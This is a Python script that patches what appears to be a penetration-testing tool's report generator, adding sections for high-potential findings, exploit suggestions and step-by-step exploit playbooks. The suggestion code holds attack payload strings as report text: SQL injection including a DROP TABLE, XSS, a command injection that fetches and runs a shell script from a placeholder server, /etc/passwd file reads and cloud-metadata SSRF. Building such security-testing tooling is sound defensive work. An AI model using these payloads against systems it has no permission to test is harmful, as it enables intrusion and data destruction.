#!/usr/bin/env python3
"""Script to add missing methods to report_generator.py"""

import os

def add_methods():
    filepath = 'reports/report_generator.py'
    
    with open(filepath, 'r') as f:
        content = f.read()
    
    # Check if methods already exist
    if '_build_high_potential_findings_section' in content:
        print("Methods already exist!")
        return
    
    # Find the insertion point
    insert_marker = '    def _build_manual_validation_section(self) -> List[str]:'
    
    if insert_marker not in content:
        print(f"Could not find insertion marker: {insert_marker}")
        return
    
    # New methods to add
    new_methods = '''    def _build_high_potential_findings_section(self) -> List[str]:
        """Build section for high-potential findings that need manual verification"""
        lines = ["## 🎯 HIGH-POTENTIAL FINDINGS", "", "*These findings have high exploit potential but require manual verification. Prioritize these for manual testing.*", ""]
        high_potential = []
        vulns = self.state.get("vulnerabilities", [])
        for v in vulns:
            if v.get("confidence", 0) >= 0.7 and not v.get("confirmed", False):
                high_potential.append({"source": "vulnerability_scan", "name": v.get("name", "Unknown"), "endpoint": v.get("endpoint", ""), "type": v.get("type", ""), "severity": v.get("severity", "MEDIUM"), "confidence": v.get("confidence", 0), "evidence": v.get("evidence", ""), "manual_steps": v.get("manual_verification_steps", [])})
        rce_chains = self.state.get("rce_chain_possibilities", [])
        for c in rce_chains:
            if c.get("severity") in ["CRITICAL", "HIGH"]:
                high_potential.append({"source": "rce_chain", "name": c.get("title", "RCE Chain"), "endpoint": c.get("endpoint", ""), "type": "RCE Chain", "severity": c.get("severity", "HIGH"), "confidence": 0.6, "evidence": c.get("evidence", ""), "components": c.get("components", []), "manual_steps": c.get("manual_verification_steps", [])})
        security_findings = self.state.get("security_findings", [])
        for f in security_findings:
            if f.get("severity") in ["CRITICAL", "HIGH"] and f.get("requires_validation", True):
                high_potential.append({"source": "security_finding", "name": f.get("title", f.get("type", "Unknown")), "endpoint": f.get("endpoint", ""), "type": f.get("type", ""), "severity": f.get("severity", "HIGH"), "confidence": 0.5, "evidence": f.get("evidence", ""), "manual_steps": f.get("manual_verification_steps", [])})
        if not high_potential:
            lines.append("No high-potential findings requiring manual verification.")
            return lines
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        high_potential.sort(key=lambda x: (severity_order.get(x["severity"], 2), -x["confidence"]))
        lines.append(f"**Total High-Potential Findings:** {len(high_potential)}")
        lines.append("")
        for severity in ["CRITICAL", "HIGH", "MEDIUM"]:
            items = [i for i in high_potential if i["severity"] == severity]
            if not items:
                continue
            lines.append(f"### {severity} Severity ({len(items)} findings)")
            lines.append("")
            for idx, item in enumerate(items[:10], 1):
                lines.extend([f"**{idx}. {item['name']}**", "", f"- **Source:** {item['source']}", f"- **Endpoint:** `{item['endpoint']}`", f"- **Type:** {item['type']}", f"- **Confidence:** {item['confidence']:.2f}", ""])
                evidence = item.get("evidence", "")
                if evidence:
                    lines.extend(["**Evidence:**", "```text", evidence[:500], "```", ""])
                manual_steps = item.get("manual_steps", [])
                if manual_steps:
                    lines.append("**Manual Verification Steps:**")
                    for step in manual_steps[:5]:
                        lines.append(f"  - {step}")
                    lines.append("")
                exploit_suggestion = self._generate_exploit_suggestion(item)
                if exploit_suggestion:
                    lines.extend(["**💡 Exploit Suggestion:**", f"  {exploit_suggestion}", ""])
            lines.append("")
        return lines

    def _generate_exploit_suggestion(self, finding: Dict) -> str:
        """Generate manual exploit suggestion based on finding type"""
        finding_type = finding.get("type", "").lower()
        name = finding.get("name", "").lower()
        endpoint = finding.get("endpoint", "")
        suggestions = []
        if any(kw in finding_type or kw in name for kw in ["sql", "sqli", "injection"]):
            suggestions.append("Try: `' OR 1=1--`, `1; DROP TABLE users--`, `UNION SELECT NULL,NULL,NULL`")
            suggestions.append(f"Use sqlmap: `sqlmap -u '{endpoint}' --dbs`")
        elif any(kw in finding_type or kw in name for kw in ["xss", "script"]):
            suggestions.append("Try: `<script>alert(1)</script>`, `\\"><img src=x onerror=alert(1)>`")
            suggestions.append("Test for stored vs reflected XSS by checking persistence")
        elif any(kw in name for kw in ["rce", "remote code", "command injection"]):
            suggestions.append("Try: `; id`, `| whoami`, `$(curl YOUR_SERVER/shell.sh | bash)`")
            suggestions.append("Test blind RCE with out-of-band techniques (DNS/HTTP callbacks)")
        elif any(kw in finding_type or kw in name for kw in ["lfi", "rfi", "file inclusion"]):
            suggestions.append("Try: `../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`")
            suggestions.append("Check for log poisoning or /proc/self/environ exposure")
        elif any(kw in finding_type or kw in name for kw in ["ssrf"]):
            suggestions.append("Try: `http://169.254.169.254/latest/meta-data/`, `file:///etc/passwd`")
            suggestions.append("Test internal network scanning via DNS callbacks")
        elif any(kw in finding_type or kw in name for kw in ["idor", "authorization", "access control"]):
            suggestions.append("Try incrementing/decrementing IDs, test with different user sessions")
            suggestions.append("Check for UUID prediction or enumeration vulnerabilities")
        elif any(kw in name for kw in ["auth", "bypass", "login"]):
            suggestions.append("Try default credentials, SQL injection in login, JWT manipulation")
            suggestions.append("Test for race conditions in authentication flow")
        elif any(kw in finding_type or kw in name for kw in ["traversal", "path"]):
            suggestions.append("Try: `../../../`, `..%2f..%2f`, `....//....//`")
            suggestions.append("Test URL-encoded and double-encoded variants")
        elif any(kw in finding_type or kw in name for kw in ["xxe", "xml"]):
            suggestions.append("Try: XXE payload with external DTD")
            suggestions.append("Test out-of-band XXE techniques")
        elif any(kw in finding_type or kw in name for kw in ["deserial", "serialization"]):
            suggestions.append("Try Java/PHP/Python deserialization payloads (ysoserial, phpggc)")
            suggestions.append("Test with OOB techniques for blind exploitation")
        else:
            suggestions.append("Review the evidence carefully and test common payloads for the vulnerability type")
            suggestions.append("Consider using Burp Suite or OWASP ZAP for manual testing")
        return " | ".join(suggestions)

    def _build_manual_exploit_playbook_section(self) -> List[str]:
        """Build detailed manual exploit playbook with step-by-step instructions"""
        lines = ["## 📋 MANUAL EXPLOIT PLAYBOOK", "", "*Step-by-step exploitation guide for high-value targets.*", ""]
        playbooks = self.state.get("manual_attack_playbook", [])
        if not playbooks:
            lines.append("No manual exploit playbooks generated.")
            return lines
        for idx, playbook in enumerate(playbooks[:5], 1):
            lines.extend([f"### Playbook {idx}: {playbook.get('name', 'Unnamed Chain')}", "", f"- **Goal:** {playbook.get('goal', 'Achieve exploitation objective')}", f"- **Risk Level:** {playbook.get('risk_level', 'MEDIUM')}", f"- **Estimated Time:** {playbook.get('estimated_time', '30 minutes')}", "", "**Prerequisites:**"])
            prerequisites = playbook.get("prerequisites", [])
            if prerequisites:
                for prereq in prerequisites:
                    lines.append(f"- {prereq}")
            else:
                lines.extend(["- Valid target endpoint", "- Network access to target"])
            lines.extend(["", "**Step-by-Step Exploitation:**", ""])
            steps = playbook.get("steps", [])
            for step_idx, step in enumerate(steps[:10], 1):
                step_title = step.get("title", f"Step {step_idx}")
                step_tool = step.get("tool", "manual")
                step_target = step.get("target", "")
                step_desc = step.get("description", "")
                lines.extend([f"**Step {step_idx}: {step_title}**"])
                if step_desc:
                    lines.append(f"  - Description: {step_desc}")
                lines.extend([f"  - Tool: {step_tool}", f"  - Target: `{step_target}`"])
                command = step.get("command", "")
                if command:
                    lines.append(f"  - Command: ```{command}```")
                expected = step.get("expected_result", "")
                if expected:
                    lines.append(f"  - Expected: {expected}")
                lines.append("")
            lines.extend(["**Post-Exploitation:**", "- Document all findings with screenshots", "- Clean up any test data created during exploitation", "- Report findings to the development team", ""])
        return lines

'''
    
    # Insert the new methods before the marker
    content = content.replace(insert_marker, new_methods + insert_marker)
    
    # Write back
    with open(filepath, 'w') as f:
        f.write(content)
    
    print("Methods added successfully!")

if __name__ == "__main__":
    add_methods()